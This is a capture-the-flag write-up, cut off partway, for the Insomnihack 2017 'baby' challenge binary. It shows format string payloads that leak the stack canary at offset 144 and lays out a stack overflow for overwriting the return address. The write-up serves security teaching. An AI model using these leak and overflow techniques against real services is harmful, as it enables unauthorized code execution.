# Insomnihack 2017 pwn 50 baby

So we are given a libc file and a binary. Let's take a look at the binary:

```
$	file baby 
baby: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, not stripped
$	pwn checksec baby 
[*] '/Hackery/insomnihack2017/baby/baby'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

So we can see that it is a `64` bit elf, with a Stack Canary, Non Executable Stack, PIE, and RELRO. This binary is a server that listens on port `1337` spawns child processes. This becomes evident when we run the binary, and nothing appears to happen, along with code like this from the function `main`:

```
    fd = socket(2, 1, 6);
    if ( fd == -1 )
    {
      perror("socket");
      result = 1;
    }
    else
    {
      optval = 1;
      if ( setsockopt(fd, 1, 2, &optval, 4u) )
      {
        perror("setsockopt");
        result = 1;
      }
      else
      {
        addr.sa_family = 2;
        *(_DWORD *)&addr.sa_data[2] = htonl(0);
        *(_WORD *)&addr.sa_data[0] = htons(0x539u);
        if ( bind(fd, &addr, 0x10u) )
        {
          perror("bind");
          result = 1;
        }
```

in addition to that, we can see that it a new process is Listening on port `1337` (dead give away):

```
netstat -planet | grep 1337
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      0          152974      -  
```

So when we connect to the server, we see this:

```
$	nc 127.0.0.1 1337
Welcome to baby's first pwn.
Pick your favorite vuln : 
   1. Stack overflow
   2. Format string
   3. Heap Overflow
   4. Exit
Your choice > 
```

So we're given the choice between three seperate types of bugs.

#### Format String

So the first step is we are going to use the format string bug to get an infoleak. To start off with, we will need to debug the child process (since that is where the code we interface with runs). Due to the fact that it is a parent which spawns child processes, the process for debugging is a little bit different:

first launch the binary in gdb, set the values for `follow-fork-mode` and `detach-on-fork` to allow for debugging child processes, and run it:
```
$	sudo gdb ./baby 

.	.	.

gdb-peda$ set follow-fork-mode child
gdb-peda$ set detach-on-fork off
gdb-peda$ r
Starting program: /Hackery/insomnihack2017/baby/baby 
```

we can see here that there are no child processes:
```
gdb-peda$ info inferiors
  Num  Description       Executable        
* 1    process 12814     /Hackery/insomnihack2017/baby/baby 
gdb-peda$ c
Continuing.
```

next we will connect to the server:
```
$	 nc 127.0.0.1 1337
Welcome to baby's first pwn.
Pick your favorite vuln : 
   1. Stack overflow
   2. Format string
   3. Heap Overflow
   4. Exit
Your choice > 
```

we can see here that there is a child process. We will switch to it, and set a breakpoint for `dofmt+0x7f`:
```
[New process 12865]

.	.	.

gdb-peda$ info inferiors
  Num  Description       Executable        
  1    <null>            /Hackery/insomnihack2017/baby/baby 
* 2    process 12865     /Hackery/insomnihack2017/baby/baby 
gdb-peda$ set inferior 2
gdb-peda$ c
Continuing.
```

Now we will execute a format string attack to see what we can see what we can leak from the stack. We will be using the format string `%lx`, which will leak 8 byte values off of the stack (since it is a `64` bit binary). I just used python to generate a string with 150 `%lx.`:

```
Your format > %lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.
7fffffffe0f0.7ffff7af4154.0.0.0.400000000.0.25900000000.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.a.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.8e5.7ffff7b99377.7fffffffe480.5af2827ced9c5d00.0.0.ffffffffffffff80.400.7ffff7dd1ee0.1.7ffff7fd8440.7ffff7ac7a5a.2.555555555f09.555555758260.7fffffffe480.7fffffffe478.0.ffffffb0.7fffffffe4d0.ffffffffffffffb0.555555759970.7ffff77de090.5af2827ced9c5d00.0.400.7fffffffe530.5555555552e7.7ffff7dd1ee0.8e.555555555e30.555555555255.8e.2.7fffffffe520.45555535c.2.5af2827ced9c5d00.7fffffffe530.5555555559cf.555555554ff0.455555f09.a32.5af2827ced9c5d00.7fffffffe590.555555555bf0.7fffffffe678.100f0b5ff.1.155555c75.
``` 

and when we hit the breakpoint in gdb, we can see what the stack canary is. We know that it is at `rbp-0x8` for two seperate reasons. First off, this is the typical place the stack canary is at because it is the last value before we hit `rbp`. The second, is that in IDA we can see that the stack canary is at `rbp-0x8`:

```
__int64 __fastcall dofmt(int a1)
{
  int bytesRead; // [sp+1Ch] [bp-414h]@2
  char input[1032]; // [sp+20h] [bp-410h]@2
  __int64 canary; // [sp+428h] [bp-8h]@1
```

so we can just see the canary by looking at `rbp-0x8`:

```
Thread 2.1 "baby" hit Breakpoint 1, 0x0000555555555547 in dofmt ()
gdb-peda$ x/g $rbp-0x8
0x7fffffffe4f8:	0x5af2827ced9c5d00
```

So here we can see that the stack canary is `0x5af2827ced9c5d00`. We can see that we got this value from the infoleak, towards the end. So we can see what exact position it is at by issuing another format string:

```
Your format > %140$lx.%141$lx.%142$lx.%143$lx.%144$lx.%145$lx.%146$lx.%147$lx.%148$lx.%149$lx
5555555559cf.555555554ff0.455555f09.a32.5af2827ced9c5d00.7fffffffe590.555555555bf0.7fffffffe678.100f0b5ff.1
```

here we can see that the loation of the stack canary is at the offset `144`, so we can leak the stack canary with the format string `%144$lx`.


#### Buffer Overflow

This is the code for the Stack Overflow bug:

```
__int64 __fastcall dostack(int conn)
{
  int bytesRead; // ST1C_4@1
  __int64 result; // rax@1
  __int64 stackCheck; // rcx@1
  char buf; // [sp+20h] [bp-410h]@1
  __int64 stackCanary; // [sp+428h] [bp-8h]@1

  stackCanary = *MK_FP(__FS__, 40LL);
  sendstr((unsigned int)conn, "How much bytes you want to send ? ");
  recv(conn, &buf, 0xAuLL, 0);
  bytesRead = atoi(&buf);
  recvlen(conn, (__int64)&buf, bytesRead);
  sendstr((unsigned int)conn, "Good luck !\n");
  result = 0LL;
  stackCheck = *MK_FP(__FS__, 40LL) ^ stackCanary;
  return result;
```

We can see that the bug is it allows us to decide how much data get's scanned into `buf`. The space `buf` has is `0x408` or `1032` bytes. Immediately following that, we will reach the stack canary, so we will need to write over the stack canary with itself, otherwise it will detect stack smashing, and we won't get code exec. After that we will just have to write over `rbp` with `8` bytes so we will get to `rbp+0x8`, which with this architecture is where the return address is stored. So after we write `1032` bytes, followed by the stack canary, followed by `8` more bytes, we will be able to write over the return address and get code execution.

#### Additional Infoleaks

Now since  `PIE` (along with the other binary protections) is enabled, we will need an additional infoleak in order to know what address we need to jump t. 
